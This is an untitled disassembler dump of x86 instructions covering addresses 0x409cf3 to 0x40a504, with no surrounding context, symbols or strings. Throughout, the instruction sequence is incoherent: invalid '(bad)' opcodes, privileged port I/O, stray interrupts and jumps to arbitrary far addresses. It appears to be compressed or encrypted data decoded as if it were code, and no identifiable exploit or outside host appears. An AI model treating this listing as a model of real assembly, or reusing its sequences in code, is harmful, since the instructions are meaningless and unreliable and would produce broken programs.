  409cf3:	std    
  409cf4:	(bad)  
  409cf5:	out    0xc3,al
  409cf7:	fdivr  DWORD PTR [esi+ebp*8-0xc241649]
  409cfe:	call   0xca3164b3
  409d03:	mov    ecx,0xcfd0f8db
  409d08:	std    
  409d09:	rol    ebp,cl
  409d0b:	icebp  
  409d0c:	loopne 0x409d11
  409d0e:	std    
  409d0f:	out    dx,eax
  409d10:	aad    0x0
  409d12:	loop   0x409d15
  409d14:	ffreep st(0)
  409d16:	shl    dh,0xb1
  409d19:	fmulp  st(0),st
  409d1b:	aam    0xc9
  409d1d:	aad    0xda
  409d1f:	stc    
  409d20:	icebp  
  409d21:	xlat   BYTE PTR ds:[ebx]
  409d22:	stc    
  409d23:	clc    
  409d24:	call   0xf22369eb
  409d29:	icebp  
  409d2a:	repnz int3 
  409d2c:	(bad)  
  409d2e:	xlat   BYTE PTR ds:[ebx]
  409d2f:	cli    
  409d30:	iret   
  409d31:	idiv   dl
  409d33:	repz out dx,eax
  409d35:	shl    bl,cl
  409d37:	shl    bl,0xf3
  409d3a:	jmp    0xbbc4:0xb9dbe4f3
  409d41:	icebp  
  409d42:	mov    eax,0xc2d5f1f4
  409d47:	(bad)  
  409d49:	mov    ah,0xf1
  409d4b:	(bad)  
  409d4c:	icebp  
  409d4d:	rcr    edx,1
  409d4f:	loope  0x409d1c
  409d51:	or     ecx,DWORD PTR [esi]
  409d53:	adc    eax,DWORD PTR [edx]
  409d55:	in     eax,0xf1
  409d57:	lds    esp,FWORD PTR [ebp-0x2b1b5012]
  409d5d:	in     al,dx
  409d5e:	(bad)  
  409d5f:	mov    eax,0xb9bfeef7
  409d64:	lock sti 
  409d66:	ret    
  409d67:	enter  0xc6b5,0xf4
  409d6b:	(bad)  
  409d6d:	test   BYTE PTR [ebx],0xe5
  409d70:	hlt    
  409d71:	add    edx,ebp
  409d73:	or     eax,0xc2c8cfe1
  409d78:	(bad)  
  409d79:	mov    al,0xc2
  409d7b:	out    dx,al
  409d7c:	call   0xb7267035
  409d81:	dec    cl
  409d83:	neg    ah
  409d85:	lock mov ebp,0xbcd4d9f6
  409d8b:	add    eax,0xe3f1fd03
  409d90:	aad    0xe2
  409d92:	jmp    0xee1a9d85
  409d97:	fsubrp st(6),st
  409d99:	enter  0xe1cd,0xc5
  409d9d:	aam    0xd9
  409d9f:	mov    cl,0xe8
  409da1:	repnz vpsubusb xmm7,xmm0,XMMWORD PTR [ebx+eiz*8+0x203b8e2]
  409dab:	(bad)  
  409dac:	out    0xe4,eax
  409dae:	push   es
  409daf:	aam    0x2
  409db1:	clc    
  409db2:	jmp    0x409dbe
  409db4:	fstp   st(4)
  409db6:	jmp    0x409d95
  409db8:	rol    esi,0xb7
  409dbb:	loop   0x409da3
  409dbd:	retf   
  409dbe:	(bad)  
  409dbf:	retf   0xf4f5
  409dc2:	mov    dh,0xea
  409dc4:	fucomi st,st(0)
  409dc6:	mov    bh,0xec
  409dc8:	mov    eax,0xbfa02fb
  409dce:	jecxz  0x409dab
  409dd0:	aam    0x4
  409dd2:	pxor   mm4,mm1
  409dd5:	fcmove st,st(5)
  409dd7:	loopne 0x409dbd
  409dd9:	out    0xd0,eax
  409ddb:	enter  0xeacb,0xb0
  409ddf:	mov    edx,0xdeedecf2
  409de4:	clc    
  409de5:	bnd ret 0xf3fa
  409de9:	frstpm(287 only) 
  409deb:	jecxz  0x409dec
  409ded:	mov    ebp,0x605e7dc
  409df3:	repz cli 
  409df5:	psrlq  mm5,QWORD PTR [ebp-0x42a4e4e]
  409dfc:	imul   BYTE PTR [esp+eax*8-0x4935202d]
  409e03:	sar    BYTE PTR [esp+ebp*8-0x3d3c063e],1
  409e0a:	int    0xe2
  409e0c:	clc    
  409e0d:	add    al,0xfb
  409e0f:	sti    
  409e10:	ror    BYTE PTR [eax],0xd8
  409e13:	retf   0xedea
  409e16:	shr    dh,1
  409e18:	int    0xe9
  409e1a:	int3   
  409e1b:	ret    
  409e1c:	jmp    0xb6357607
  409e21:	repnz shr eax,cl
  409e24:	mov    edi,0xccbedfde
  409e29:	cld    
  409e2a:	fcmovnb st,st(6)
  409e2c:	or     ebx,esi
  409e2e:	shl    eax,0xe6
  409e31:	or     cl,bl
  409e33:	(bad)  
  409e35:	add    eax,0xf3e6a8c6
  409e3a:	out    0xd0,eax
  409e3c:	into   
  409e3d:	mov    cl,0xef
  409e3f:	mov    ebx,0xbebdf9f5
  409e44:	out    dx,eax
  409e45:	stc    
  409e46:	ret    
  409e47:	xlat   BYTE PTR ds:[ebx]
  409e48:	repnz hlt 
  409e4a:	(bad)  
  409e4b:	loope  0x409e26
  409e4d:	std    
  409e4e:	call   0xe845a859
  409e53:	or     al,0x8
  409e55:	inc    ch
  409e57:	in     eax,dx
  409e58:	repnz shl al,cl
  409e5b:	in     al,dx
  409e5c:	lds    esi,FWORD PTR [ebp-0x32170813]
  409e62:	retf   
  409e63:	cld    
  409e64:	in     eax,dx
  409e65:	add    ecx,ecx
  409e67:	out    0xb9,eax
  409e69:	lock add al,0xfa
  409e6c:	fcmovbe st,st(1)
  409e6e:	clc    
  409e6f:	jmp    0x409e74
  409e71:	jecxz  0x409e3a
  409e73:	vpslld ymm0,ymm2,xmm7
  409e77:	jmp    0xdbc3:0xc7d5ebc7
  409e7e:	aad    0xd2
  409e80:	lods   eax,DWORD PTR ds:[esi]
  409e81:	fdiv   st,st(2)
  409e83:	stc    
  409e84:	int    0xd5
  409e86:	icebp  
  409e87:	out    0xf6,eax
  409e89:	in     eax,0xf1
  409e8b:	rcl    esp,1
  409e8d:	add    al,BYTE PTR [eax+ebx*8]
  409e90:	or     BYTE PTR [ecx],cl
  409e92:	ffreep st(4)
  409e94:	std    
  409e95:	repnz enter 0xd2c0,0xed
  409e9a:	ffree  st(3)
  409e9c:	not    ebx
  409e9e:	sar    cl,1
  409ea0:	mov    edx,0xc9edb5cf
  409ea5:	add    edi,DWORD PTR [esi-0x252f4013]
  409eab:	cmc    
  409eac:	stc    
  409ead:	or     esi,eax
  409eaf:	cmc    
  409eb0:	enter  0xdbdc,0xeb
  409eb4:	out    dx,eax
  409eb5:	(bad)  
  409eb6:	out    dx,eax
  409eb7:	leave  
  409eb8:	out    0xb6,al
  409eba:	ror    esi,1
  409ebc:	test   eax,0xc4d1f8da
  409ec1:	shl    dl,1
  409ec3:	fidivr DWORD PTR [edi-0x4281d02]
  409ec9:	(bad)  
  409eca:	(bad)  
  409ecb:	cld    
  409ecc:	mov    esp,0xfc03dcc3
  409ed1:	push   cs
  409ed2:	int    0x0
  409ed4:	fcomi  st,st(2)
  409ed6:	mov    esp,0xb6d1cfe4
  409edb:	in     eax,0xc3
  409edd:	retf   0xd7f4
  409ee0:	shr    ecx,cl
  409ee2:	sar    ah,cl
  409ee4:	std    
  409ee5:	ret    
  409ee6:	shl    dl,cl
  409ee8:	fdiv   st,st(7)
  409eea:	rcl    cl,1
  409eec:	repnz fisttp DWORD PTR [ecx]
  409eef:	jmp    0x1e3:0xdacfc9c4
  409ef6:	repnz mov eax,0xe8b5e7e2
  409efc:	neg    dl
  409efe:	out    dx,eax
  409eff:	(bad)
  409f02:	repnz add esi,esi
  409f05:	ret    
  409f06:	(bad)  
  409f07:	not    ah
  409f09:	out    0xd8,al
  409f0b:	aam    0xc7
  409f0d:	add    esp,ebp
  409f0f:	dec    BYTE PTR [edi]
  409f11:	add    al,0xdb
  409f13:	add    BYTE PTR ds:0xa9e3ccf1,cl
  409f19:	loope  0x409ed0
  409f1b:	lods   eax,DWORD PTR ds:[esi]
  409f1c:	out    dx,al
  409f1d:	not    ecx
  409f1f:	repnz leave 
  409f21:	enter  0xefdb,0xcc
  409f25:	aad    0x3
  409f27:	fdiv   st(0),st
  409f29:	out    0xf5,eax
  409f2b:	stc    
  409f2c:	(bad)  
  409f2f:	(bad)  
  409f30:	or     edx,esi
  409f32:	jmp    0xd90f9c18
  409f37:	mov    esp,0xcecbc6e3
  409f3c:	not    cl
  409f3e:	clc    
  409f3f:	(bad)  
  409f40:	repz mov dh,0xd6
  409f43:	fcmovnu st,st(1)
  409f45:	jecxz  0x409f35
  409f47:	mov    edx,0xd700e3f5
  409f4c:	(bad)  
  409f4d:	fsubrp st(4),st
  409f4f:	in     eax,0xf4
  409f51:	cli    
  409f52:	clc    
  409f53:	or     ch,bh
  409f55:	add    eax,0xd3d1e2ce
  409f5a:	jmp    0xdbd9:0xcface7b2
  409f61:	imul   cl
  409f63:	mov    ebx,0xb6f0bbce
  409f68:	mov    ebp,0xf3e0e207
  409f6d:	ret    0xdf07
  409f70:	jecxz  0x409f7b
  409f72:	(bad)  
  409f74:	jmp    0xaeeb:0xb0eee1e8
  409f7b:	loop   0x409f4f
  409f7d:	icebp  
  409f7e:	retf   0xd6d7
  409f81:	int3   
  409f82:	fninit 
  409f84:	fcmovnu st,st(7)
  409f86:	iret   
  409f87:	out    dx,al
  409f88:	rcl    cl,0xda
  409f8b:	(bad)  
  409f8c:	in     al,0xc3
  409f8e:	lock leave 
  409f90:	jmp    0xbcdc:0xfdf9c908
  409f97:	icebp  
  409f98:	mov    al,0xe4
  409f9a:	repnz out 0xcc,eax
  409f9d:	cli    
  409f9e:	lock out dx,eax
  409fa0:	in     al,dx
  409fa1:	cli    
  409fa2:	in     al,0xeb
  409fa4:	into   
  409fa5:	lock add al,BYTE PTR [ecx]
  409fa8:	ffreep st(0)
  409faa:	fdiv   st,st(2)
  409fac:	ret    
  409fad:	fucomi st,st(3)
  409faf:	fcmovu st,st(1)
  409fb1:	fldln2 
  409fb3:	retf   0xe30e
  409fb6:	mov    esi,0xece5e3f3
  409fbb:	int3   
  409fbc:	cmc    
  409fbd:	cmc    
  409fbe:	icebp  
  409fbf:	fmul   st,st(5)
  409fc1:	sti    
  409fc2:	sar    DWORD PTR [esi+0x3e0efff],1
  409fc8:	int    0xcc
  409fca:	rcl    esp,0xd0
  409fcd:	add    bl,ch
  409fcf:	add    bh,dl
  409fd1:	add    eax,0xf8dbc602
  409fd6:	mov    ebp,0xf5c7cdb1
  409fdb:	in     eax,0xd0
  409fdd:	mov    bl,0xcc
  409fdf:	out    0xd4,eax
  409fe1:	(bad)  
  409fe2:	mov    ah,0xf4
  409fe4:	jecxz  0x409f96
  409fe6:	mov    esi,0xf2f501fa
  409feb:	rol    bl,1
  409fed:	fld    st(3)
  409fef:	pop    es
  409ff0:	loop   0x409fb6
  409ff2:	inc    DWORD PTR [eax]
  409ff4:	add    ecx,DWORD PTR [esi]
  409ff6:	mov    edi,0xc2c8e0b0
  409ffb:	shr    dl,1
  409ffd:	lods   al,BYTE PTR ds:[esi]
  409ffe:	mov    ebx,0xf0bbd6e8
  40a003:	out    dx,eax
  40a004:	loop   0x409fbe
  40a006:	aad    0xe3
  40a008:	lock mov ebp,0xfae4fafb
  40a00e:	aam    0xc0
  40a010:	jmp    0x409fdd
  40a012:	in     eax,0xcc
  40a014:	add    al,0x12
  40a016:	les    esi,FWORD PTR [edx-0xf1f431d]
  40a01c:	(bad)
  40a01f:	xlat   BYTE PTR ds:[ebx]
  40a020:	ror    eax,cl
  40a022:	mov    ebp,0xd2f3bb03
  40a027:	loop   0x40a001
  40a029:	rol    ebx,cl
  40a02b:	loopne 0x409ff3
  40a02d:	mov    eax,0xf9efe6d4
  40a032:	add    al,0xdf
  40a034:	clc    
  40a035:	add    eax,0xf7e5f1de
  40a03a:	out    dx,eax
  40a03b:	into   
  40a03c:	(bad)  
  40a03d:	shl    DWORD PTR [ecx-0x3162e4b],cl
  40a043:	fdivrp st(4),st
  40a045:	mov    ebp,0xf7bffdd4
  40a04a:	push   es
  40a04b:	ret    0xfddb
  40a04e:	in     eax,0xe7
  40a050:	xlat   BYTE PTR ds:[ebx]
  40a051:	call   0xe2b9e38
  40a056:	iret   
  40a057:	int    0xec
  40a059:	jmp    0x40a051
  40a05b:	jmp    0x40a02c
  40a05d:	leave  
  40a05e:	mov    dl,0xce
  40a060:	int3   
  40a061:	in     al,dx
  40a062:	shr    esi,1
  40a064:	inc    DWORD PTR [ebx]
  40a066:	aad    0xbf
  40a068:	out    0xee,eax
  40a06a:	clc    
  40a06b:	loop   0x40a032
  40a06d:	icebp  
  40a06e:	stc    
  40a06f:	loopne 0x40a04a
  40a071:	fadd   QWORD PTR [ecx]
  40a073:	loopne 0x40a058
  40a075:	into   
  40a076:	mov    dl,0xc2
  40a078:	in     al,0xf7
  40a07a:	iret   
  40a07b:	retf   0xbaa9
  40a07e:	call   0xf5f95b7a
  40a083:	jmp    0x40a061
  40a085:	fmulp  st(6),st
  40a087:	mov    edx,0xf806ecd0
  40a08c:	mov    ecx,0xc0bee2ff
  40a091:	jmp    0xa48a56f
  40a096:	repnz scas al,BYTE PTR es:[edi]
  40a098:	jmp    0xf70a9080
  40a09d:	mov    bh,0xe0
  40a09f:	xlat   BYTE PTR ds:[ebx]
  40a0a0:	mov    ch,0xec
  40a0a2:	xlat   BYTE PTR ds:[ebx]
  40a0a3:	fxch   st(2)
  40a0a5:	sar    ah,1
  40a0a7:	int    0xd2
  40a0a9:	stc    
  40a0aa:	mov    DWORD PTR [ecx],0xd4c7cad9
  40a0b0:	cli    
  40a0b1:	pop    es
  40a0b2:	int    0xee
  40a0b4:	fmul   QWORD PTR ds:0xafd2bcee
  40a0ba:	stos   DWORD PTR es:[edi],eax
  40a0bb:	lods   al,BYTE PTR ds:[esi]
  40a0bc:	in     eax,0xb7
  40a0be:	loope  0x40a074
  40a0c0:	in     al,dx
  40a0c1:	fidivr WORD PTR [ecx-0x221e4a0e]
  40a0c7:	icebp  
  40a0c8:	out    dx,eax
  40a0c9:	(bad)  
  40a0cb:	cld    
  40a0cc:	fsubr  st(1),st
  40a0ce:	pop    es
  40a0cf:	out    dx,eax
  40a0d0:	push   es
  40a0d1:	iret   
  40a0d2:	jecxz  0x40a0d1
  40a0d4:	fcmovne st,st(6)
  40a0d6:	repnz ror ecx,1
  40a0d9:	in     al,dx
  40a0da:	scas   al,BYTE PTR es:[edi]
  40a0db:	mov    bh,0xce
  40a0dd:	loop   0x40a0b3
  40a0df:	out    0xad,al
  40a0e1:	fcmovne st,st(1)
  40a0e3:	shr    edi,cl
  40a0e5:	loop   0x40a0aa
  40a0e7:	mov    edx,0xddfcedc3
  40a0ec:	sar    al,0xfe
  40a0ef:	clc    
  40a0f0:	pop    es
  40a0f1:	not    ch
  40a0f3:	leave  
  40a0f4:	fmul   QWORD PTR [edi]
  40a0f6:	rcr    esi,cl
  40a0f8:	rcl    dh,0xdd
  40a0fb:	lods   al,BYTE PTR ds:[esi]
  40a0fc:	cmc    
  40a0fd:	out    0xf3,eax
  40a0ff:	enter  0xf3fa,0xf6
  40a103:	mov    ebx,0xdbecdcd1
  40a108:	cld    
  40a109:	mov    esp,0xe0fae7f6
  40a10e:	or     ah,al
  40a110:	or     al,BYTE PTR [ecx]
  40a112:	or     BYTE PTR [esi],al
  40a114:	fucomi st,st(7)
  40a116:	mov    dl,0xc8
  40a118:	out    0xde,al
  40a11a:	out    dx,al
  40a11b:	jmp    0x40a108
  40a11d:	iret   
  40a11e:	cli    
  40a11f:	scas   al,BYTE PTR es:[edi]
  40a120:	aad    0xe4
  40a122:	sti    
  40a123:	call   0xf4337020
  40a128:	shl    edi,cl
  40a12a:	out    0xd2,al
  40a12c:	icebp  
  40a12d:	inc    bl
  40a12f:	or     BYTE PTR [esi],cl
  40a131:	jecxz  0x40a118
  40a133:	adc    ebx,eax
  40a135:	jmp    0xc4ea88fd
  40a13a:	leave  
  40a13b:	imul   ecx
  40a13d:	not    ecx
  40a13f:	hlt    
  40a140:	mov    bh,0xd1
  40a142:	out    dx,eax
  40a143:	out    dx,al
  40a144:	mov    ebp,0xecdcf3e9
  40a149:	(bad)  
  40a14a:	mov    ebx,0xc4f0b9bd
  40a14f:	add    eax,DWORD PTR [edx+ecx*1]
  40a152:	cld    
  40a153:	loopne 0x40a147
  40a155:	repnz int 0xaf
  40a158:	into   
  40a159:	rep lods al,BYTE PTR ds:[esi]
  40a15b:	hlt    
  40a15c:	lods   eax,DWORD PTR ds:[esi]
  40a15d:	out    dx,eax
  40a15e:	int3   
  40a15f:	lds    edi,FWORD PTR [edx-0x60f3430]
  40a165:	neg    ah
  40a167:	add    BYTE PTR [esi],al
  40a169:	out    0x3,al
  40a16b:	or     ebx,eax
  40a16d:	add    eax,0x2d6f0
  40a172:	fdiv   st(1),st
  40a174:	add    al,0xfa
  40a176:	loop   0x40a129
  40a178:	scas   eax,DWORD PTR es:[edi]
  40a179:	ret    0xf4f3
  40a17c:	loope  0x40a12a
  40a17e:	scas   eax,DWORD PTR es:[edi]
  40a17f:	stc    
  40a180:	jmp    0xf4b9:0xc8b4d8ed
  40a187:	repnz sti 
  40a189:	mov    esi,0xe1bcd5cd
  40a18e:	neg    dl
  40a190:	(bad)  
  40a192:	add    al,0xe7
  40a194:	std    
  40a195:	add    ebp,DWORD PTR [edi-0x51192137]
  40a19b:	in     eax,dx
  40a19c:	sar    DWORD PTR [edx-0x3049342a],cl
  40a1a2:	mov    ah,0xed
  40a1a4:	lock fcomi st,st(5)
  40a1a7:	imul   edi
  40a1a9:	loope  0x40a181
  40a1ab:	push   edi
  40a1ad:	mov    esp,0xceea0fe0
  40a1b2:	into   
  40a1b3:	leave  
  40a1b4:	adc    ebp,esi
  40a1b6:	ret    0xcee4
  40a1b9:	repnz aam 0xea
  40a1bc:	mov    ah,0xb0
  40a1be:	iret   
  40a1bf:	mov    edx,0xdac4ced9
  40a1c4:	in     eax,dx
  40a1c5:	mov    edx,0xeecd02f0
  40a1ca:	in     eax,0xdc
  40a1cc:	jmp    ebx
  40a1ce:	lock cmc 
  40a1d0:	xlat   BYTE PTR ds:[ebx]
  40a1d1:	clc    
  40a1d2:	std    
  40a1d3:	loop   0x40a1b5
  40a1d5:	jmp    0xd0346d88
  40a1da:	aad    0xc0
  40a1dc:	jecxz  0x40a1a4
  40a1de:	retf   0xfbf3
  40a1e1:	lods   al,BYTE PTR ds:[esi]
  40a1e2:	fcomi  st,st(0)
  40a1e4:	sar    ebx,cl
  40a1e6:	repz div esp
  40a1e9:	fsubp  st(5),st
  40a1eb:	or     eax,DWORD PTR [edi]
  40a1ed:	stc    
  40a1ee:	ret    
  40a1ef:	retf   
  40a1f0:	push   es
  40a1f1:	clc    
  40a1f2:	(bad)  
  40a1f4:	int3   
  40a1f5:	push   es
  40a1f6:	mov    ebp,0xc2c2e7e7
  40a1fb:	into   
  40a1fc:	mov    dh,0xcc
  40a1fe:	iret   
  40a1ff:	mov    ebx,0xede9f0f4
  40a204:	repz retf 0xe2cc
  40a208:	rcr    bl,cl
  40a20a:	std    
  40a20b:	loopne 0x40a1d3
  40a20d:	std    
  40a20e:	clc    
  40a20f:	lock pop es
  40a211:	(bad)  
  40a212:	stc    
  40a213:	loop   0x40a222
  40a215:	stc    
  40a216:	jmp    0xd0085fdc
  40a21b:	shl    edi,cl
  40a21d:	call   0xd32593d9
  40a222:	into   
  40a223:	leave  
  40a224:	cli    
  40a225:	in     al,dx
  40a226:	add    bh,BYTE PTR [ecx-0x1f2e2f08]
  40a22c:	ret    0xc9d6
  40a22f:	push   ebp
  40a231:	or     ah,al
  40a233:	fimul  WORD PTR [eax]
  40a235:	enter  0xbfe4,0xa9
  40a239:	jmp    0xe104690d
  40a23e:	(bad)  
  40a23f:	mov    esp,0xcdd9d8db
  40a245:	inc    DWORD PTR [edx]
  40a247:	add    esp,eax
  40a249:	rcr    ebp,0x7
  40a24c:	add    al,0xc4
  40a24e:	sti    
  40a24f:	leave  
  40a250:	loopne 0x40a253
  40a252:	or     al,0xca
  40a254:	int3   
  40a255:	int    0xd8
  40a257:	mul    ecx
  40a259:	in     eax,0xf0
  40a25b:	mov    cl,0xb1
  40a25d:	into   
  40a25e:	shl    BYTE PTR [ecx-0x72b4a45],0xd9
  40a265:	loope  0x40a257
  40a267:	iret   
  40a268:	hlt    
  40a269:	lock in al,dx
  40a26b:	(bad)  
  40a26d:	std    
  40a26e:	retf   
  40a26f:	push   es
  40a270:	loope  0x40a239
  40a272:	fldln2 
  40a274:	fimul  DWORD PTR [esi]
  40a276:	jmp    0xe6287947
  40a27b:	stos   BYTE PTR es:[edi],al
  40a27c:	repnz int 0xd4
  40a27f:	mov    edx,0xf2dfd6e9
  40a284:	call   0xdb1fa352
  40a289:	cmc    
  40a28a:	int    0xc5
  40a28c:	cld    
  40a28d:	inc    BYTE PTR [edi]
  40a28f:	lar    eax,WORD PTR [eax]
  40a292:	jmp    0xb2209071
  40a297:	icebp  
  40a298:	(bad)  
  40a299:	mov    bl,0xcb
  40a29b:	rol    al,0xc2
  40a29e:	retf   
  40a29f:	fcmovb st,st(4)
  40a2a1:	xlat   BYTE PTR ds:[ebx]
  40a2a2:	(bad)  
  40a2a3:	mov    dl,0xce
  40a2a5:	push   ebp
  40a2a7:	call   eax
  40a2a9:	rol    BYTE PTR [ebx],cl
  40a2ab:	xlat   BYTE PTR ds:[ebx]
  40a2ac:	mul    esi
  40a2ae:	cli    
  40a2af:	add    dl,ch
  40a2b1:	mov    esp,0x130dd402
  40a2b6:	lock ret 
  40a2b8:	enter  0xaee3,0xfb
  40a2bc:	fcmovne st,st(6)
  40a2be:	jmp    0x40a2ab
  40a2c0:	repz aam 0xca
  40a2c3:	retf   0xd5f9
  40a2c6:	lock add edx,edi
  40a2c9:	hlt    
  40a2ca:	aad    0xf5
  40a2cc:	(bad)  
  40a2ce:	cld    
  40a2cf:	fcmovb st,st(5)
  40a2d1:	mov    esp,0xffe1fdfe
  40a2d6:	mov    cl,0xe8
  40a2d8:	in     al,dx
  40a2d9:	rcr    ebp,cl
  40a2db:	xlat   BYTE PTR ds:[ebx]
  40a2dc:	(bad)  
  40a2dd:	jmp    0xb1197eb9
  40a2e2:	fsubr  st,st(0)
  40a2e4:	leave  
  40a2e5:	mov    eax,0xcdd1efbe
  40a2ea:	mov    esp,0x9c0e0c2
  40a2ef:	(bad)  
  40a2f0:	aad    0xee
  40a2f2:	iret   
  40a2f3:	(bad)  
  40a2f4:	out    0xf2,eax
  40a2f6:	(bad)  
  40a2f7:	loop   0x40a2a2
  40a2f9:	iret   
  40a2fa:	(bad)  
  40a2fb:	loopne 0x40a2af
  40a2fd:	mov    al,0xe6
  40a2ff:	mov    ah,0xd2
  40a301:	fdiv   st,st(6)
  40a303:	out    dx,al
  40a304:	rcr    edx,1
  40a306:	jmp    0x81896c7
  40a30b:	aad    0x5
  40a30d:	hlt    
  40a30e:	add    eax,0xc7dbd804
  40a313:	loope  0x40a31a
  40a315:	in     al,0xe9
  40a317:	shr    DWORD PTR [eax-0x4a290936],0xcc
  40a31e:	out    dx,eax
  40a31f:	loopne 0x40a315
  40a321:	into   
  40a322:	les    edi,FWORD PTR [esi-0x2d0c1307]
  40a328:	(bad)  
  40a329:	loopne 0x40a2ea
  40a32b:	sar    edx,0x0
  40a32e:	add    cl,cl
  40a330:	jmp    0xf3f3:0x6d9fac9
  40a337:	loop   0x40a328
  40a339:	icebp  
  40a33a:	lock jecxz 0x40a32d
  40a33d:	(bad)
  40a340:	fsubr  st,st(1)
  40a342:	int3   
  40a343:	cli    
  40a344:	std    
  40a345:	loop   0x40a339
  40a347:	idiv   edx
  40a349:	pop    es
  40a34a:	out    0xb,eax
  40a34c:	cli    
  40a34d:	(bad)  
  40a34e:	mov    edi,0xdfe0f903
  40a353:	aam    0xfb
  40a355:	enter  0xecc0,0xf6
  40a359:	mov    al,0xc4
  40a35b:	shl    ebx,1
  40a35d:	retf   
  40a35e:	jmp    0x40a30e
  40a360:	iret   
  40a361:	sti    
  40a362:	rcr    esp,1
  40a364:	mov    edx,0xd5cef9f7
  40a369:	int3   
  40a36a:	fiadd  DWORD PTR [edx+edx*8]
  40a36d:	push   es
  40a36e:	fiadd  WORD PTR [eax]
  40a370:	out    0xc7,al
  40a372:	or     dl,BYTE PTR [ebx]
  40a374:	jmp    0xbf31774b
  40a379:	scas   al,BYTE PTR es:[edi]
  40a37a:	loopne 0x40a340
  40a37c:	(bad)  
  40a37d:	enter  0xd9b4,0xb5
  40a381:	lock mov edi,0xd2e2d4b2
  40a387:	mov    esp,0xfcd8cdfa
  40a38c:	mov    ecx,0xf6fd09f9
  40a391:	call   0xe10eb19c
  40a396:	lods   al,BYTE PTR ds:[esi]
  40a397:	repnz shl esp,1
  40a39a:	mul    esp
  40a39c:	mov    dh,0xb2
  40a39e:	rcr    edi,0xc8
  40a3a1:	icebp  
  40a3a2:	in     eax,dx
  40a3a3:	fcomi  st,st(0)
  40a3a5:	fucomip st,st(4)
  40a3a7:	(bad)  
  40a3a9:	ret    
  40a3aa:	cli    
  40a3ab:	add    bl,ch
  40a3ad:	mov    esp,0xe2d9fec0
  40a3b2:	mov    ebp,0xcda80707
  40a3b8:	iret   
  40a3b9:	lods   eax,DWORD PTR ds:[esi]
  40a3ba:	repz call 0xdb21987b
  40a3c0:	lds    edi,FWORD PTR [edx-0xc090c0b]
  40a3c6:	lock jecxz 0x40a3a5
  40a3c9:	fiadd  WORD PTR [esp+edx*8]
  40a3cc:	clc    
  40a3cd:	sti    
  40a3ce:	shl    esp,0x7
  40a3d1:	fimul  WORD PTR [edx]
  40a3d3:	into   
  40a3d4:	fcomp  st(6)
  40a3d6:	mov    edi,0xe6eeefef
  40a3db:	jmp    0x40a3d1
  40a3dd:	in     eax,0xeb
  40a3df:	jmp    0xca406dbb
  40a3e4:	leave  
  40a3e5:	retf   0xe0fb
  40a3e8:	repz jecxz 0x40a3cf
  40a3eb:	xlat   BYTE PTR ds:[ebx]
  40a3ec:	mov    esp,0x8e5f0fc
  40a3f1:	psubsb mm3,mm7
  40a3f4:	jmp    0xb3d0:0xf1cbebf2
  40a3fb:	int3   
  40a3fc:	jmp    0x40a3b0
  40a3fe:	shr    bl,0xfb
  40a401:	mov    eax,0xe8d3e3f7
  40a406:	(bad)  
  40a408:	aad    0xf3
  40a40a:	jecxz  0x40a411
  40a40c:	cmc    
  40a40d:	jmp    0x40a416
  40a40f:	loop   0x40a412
  40a411:	out    dx,eax
  40a412:	(bad)  
  40a413:	retf   
  40a414:	lds    eax,FWORD PTR [edi]
  40a416:	mov    dl,0xd1
  40a418:	repnz int 0xd3
  40a41b:	(bad)  
  40a41c:	into   
  40a41d:	shl    BYTE PTR [eax-0x30172e29],0xd8
  40a424:	into   
  40a425:	fyl2x  
  40a427:	icebp  
  40a428:	(bad)  
  40a42a:	(bad)  
  40a42b:	mov    ebp,0x90001dc
  40a430:	aam    0x1
  40a432:	or     cl,bl
  40a434:	in     al,dx
  40a435:	out    dx,eax
  40a436:	retf   
  40a437:	scas   al,BYTE PTR es:[edi]
  40a438:	retf   0xc8b1
  40a43b:	aad    0xcb
  40a43d:	retf   0xccb4
  40a440:	cli    
  40a441:	xlat   BYTE PTR ds:[ebx]
  40a442:	fcomip st,st(5)
  40a444:	retf   0xd3e1
  40a447:	icebp  
  40a448:	cmc    
  40a449:	mov    ebp,0xe70abddc
  40a44e:	(bad)  
  40a44f:	out    0xfe,eax
  40a451:	or     BYTE PTR [eax],cl
  40a453:	push   cs
  40a454:	stc    
  40a455:	add    cl,ah
  40a457:	mov    eax,0xbcc4d6c6
  40a45c:	shl    BYTE PTR [edi-0x25393827],cl
  40a462:	sti    
  40a463:	int3   
  40a464:	mov    esp,0xd6cebdd0
  40a469:	out    0xfb,al
  40a46b:	neg    ecx
  40a46d:	ret    
  40a46e:	jecxz  0x40a451
  40a470:	fld    QWORD PTR [ecx]
  40a472:	add    eax,0xdfde0cfb
  40a477:	fmul   st(3),st
  40a479:	ror    edx,0xe4
  40a47c:	xlat   BYTE PTR ds:[ebx]
  40a47d:	retf   0xeaf1
  40a480:	clc    
  40a481:	int    0xbf
  40a483:	xlat   BYTE PTR ds:[ebx]
  40a484:	sti    
  40a485:	mov    al,0xdf
  40a487:	loopne 0x40a460
  40a489:	add    bl,dl
  40a48b:	ret    
  40a48c:	repz test dl,0xcb
  40a490:	(bad)
  40a493:	jmp    0x40a47c
  40a495:	loope  0x40a487
  40a497:	(bad)  
  40a498:	(bad)  
  40a49a:	(bad)
  40a49d:	aam    0xeb
  40a49f:	(bad)  
  40a4a0:	lock call 0xf00a7d5a
  40a4a6:	mov    esp,0xcdb4ddfa
  40a4ab:	mov    esp,0xdfe7fde6
  40a4b0:	std    
  40a4b1:	out    dx,eax
  40a4b2:	push   es
  40a4b3:	out    dx,al
  40a4b4:	fsub   st,st(2)
  40a4b6:	jmp    0xb7d2:0xe1aca5c2
  40a4bd:	loop   0x40a4a8
  40a4bf:	jmp    0x40a47a
  40a4c1:	clc    
  40a4c2:	call   0xe03270a1
  40a4c7:	test   BYTE PTR [esi],0xde
  40a4ca:	(bad)  
  40a4cc:	jecxz  0x40a4d7
  40a4ce:	(bad)  
  40a4cf:	in     eax,0xd9
  40a4d1:	(bad)  
  40a4d3:	(bad)  
  40a4d4:	out    dx,eax
  40a4d5:	add    eax,0xcdaecddc
  40a4da:	in     al,0xca
  40a4dc:	iret   
  40a4dd:	imul   ebx
  40a4df:	retf   0xcfc9
  40a4e2:	mov    bh,0xea
  40a4e4:	std    
  40a4e5:	enter  0x1c3,0xf9
  40a4e9:	stc    
  40a4ea:	repnz inc bh
  40a4ed:	(bad)  
  40a4ee:	std    
  40a4ef:	lock lds ecx,FWORD PTR [eax]
  40a4f2:	aam    0x4
  40a4f4:	add    BYTE PTR [edx+eax*8],al
  40a4f7:	(bad)  
  40a4f9:	in     al,dx
  40a4fa:	lods   al,BYTE PTR ds:[esi]
  40a4fb:	lds    edi,FWORD PTR [ebx-0x190a4f0d]
  40a501:	(bad)  
  40a502:	ror    al,1
  40a504:	(bad)  
